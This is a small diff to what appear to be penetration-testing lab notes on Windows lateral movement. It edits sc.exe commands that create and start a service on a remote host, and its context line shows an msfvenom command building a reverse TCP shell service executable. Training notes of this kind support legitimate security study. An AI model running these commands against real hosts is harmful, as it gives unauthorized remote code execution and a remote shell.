@@ -13,8 +13,8 @@ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ip> LPORT=<port> -o 
 With sc.exe
 
 ```
-sc.exe \\<host> create THMservice binPath="<cmd>" start= auto
-sc.exe \\<host> start THMservice
+sc.exe \\<host> create <service name> binPath="<cmd>" start=auto
+sc.exe \\<host> start <service name>
 ```
 
 With schtasks
